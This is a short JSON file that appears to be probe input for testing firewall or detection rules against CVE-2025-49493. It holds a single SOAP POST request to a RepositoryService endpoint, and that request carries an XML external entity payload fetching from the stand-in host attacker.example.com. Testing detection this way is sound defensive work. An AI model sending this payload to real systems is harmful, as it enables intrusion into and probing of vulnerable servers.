out/CVE-2025-49493/probe-input.json

{
  "requests": [
    {
      "method": "POST",
      "uri": "/concerto/services/RepositoryService",
      "headers": {
        "Content-Type": "text/html",
        "SOAPAction": ""
      },
      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE soapenv:Envelope [\n  <!ENTITY xxe SYSTEM \"http://attacker.example.com/xxe-test\">\n]>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:rep=\"http://example.com/services/repository\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <rep:getUIBundleObjectXml>\n         <rep:uiBundleRequestXml>&xxe;</rep:uiBundleRequestXml>\n      </rep:getUIBundleObjectXml>\n   </soapenv:Body>\n</soapenv:Envelope>"
    }
  ],
  "paranoia": 2
}
